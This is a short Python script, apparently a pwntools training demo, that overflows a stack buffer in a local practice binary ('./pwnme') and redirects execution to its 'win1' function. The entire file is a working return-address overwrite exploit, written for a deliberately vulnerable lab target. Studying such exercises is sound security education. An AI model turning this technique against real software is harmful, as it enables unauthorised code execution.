#!/usr/bin/env python3
# usage: python3 pwntools_demo.py
from pwn import *

e = ELF('./pwnme')

p = process('./pwnme')
# alternative option to run the binary in gdb while debugging
# p = gdb.debug('./pwnme', gdbscript=''''\
# b main
# c
# ''')

payload = b''
payload += b'A' * 16 # fill the buffer
payload += b'B' * 8  # overwrite some other misc data on the stack
payload += b'C' * 4  # padding for ebp

payload += p32(e.functions.win1.address)  # win1 function address

p.sendline(payload) # send the payload

p.interactive() # make the process interactive in the terminal

